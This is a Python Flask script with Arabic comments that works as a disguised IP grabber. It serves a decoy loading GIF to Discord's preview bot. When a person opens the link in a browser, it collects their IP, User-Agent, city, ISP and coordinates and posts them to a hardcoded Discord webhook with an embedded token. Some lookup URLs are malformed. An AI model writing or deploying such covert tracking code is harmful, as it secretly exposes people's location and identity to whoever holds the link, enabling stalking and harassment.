from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# --- إعداداتك ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
REAL_IMAGE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvw7uLGr6ScxbGYJhGNqEjXnW-e6nJaE5c0w&s"
# رابط صورة التحميل الوهمية التي ستظهر في ديسكورد
LOADING_GIF = "https://tenor.com/view/loading-discord-loading-discord-boxes-squares-gif-16187521" 

@app.route('/api/image')
def logger():
    ua = request.headers.get('User-Agent', '')
    # جلب الـ IP الحقيقي عبر Vercel
    ip_addr = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    # 1. خدعة ديسكورد: إرسال صورة ثابتة أو تحميل لكي يظن الشخص أنها لم تفتح
    if "discord" in ua.lower() or "bot" in ua.lower():
        # نرسل صورة التحميل لديسكورد فقط بدون تسجيل معلومات
        res = requests.get(LOADING_GIF)
        return send_file(io.BytesIO(res.content), mimetype='image/jpeg')

    # 2. إذا فتح الشخص الرابط في المتصفح (هنا يبدأ سحب البيانات)
    try:
        # جلب معلومات الموقع بدقة
        data = requests.get(f"http://ip-api.com{ip_addr}?fields=16976857").json()
        
        embed = {
            "title": "🚨 تم فتح الرابط في المتصفح!",
            "color": 0xFF0000,
            "fields": [
                {"name": "📍 الموقع", "value": f"{data.get('city')}, {data.get('country')}", "inline": True},
                {"name": "🏢 المزود", "value": data.get('isp'), "inline": True},
                {"name": "📱 الجهاز", "value": f"```\n{ua}\n```", "inline": False},
                {"name": "🗺️ خريطة جوجل", "value": f"[اضغط هنا](https://google.com{data.get('lat')},{data.get('lon')})"}
            ],
            "footer": {"text": f"IP: {ip_addr}"}
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except:
        # إذا فشل جلب الموقع، نرسل الـ IP كحد أدنى
        requests.post(WEBHOOK_URL, json={"content": f"Logged IP: {ip_addr}"})

    # إرسال الصورة الأصلية للمتصفح
    res = requests.get(REAL_IMAGE)
    return send_file(io.BytesIO(res.content), mimetype='image/png')

if __name__ == "__main__":
    app.run()
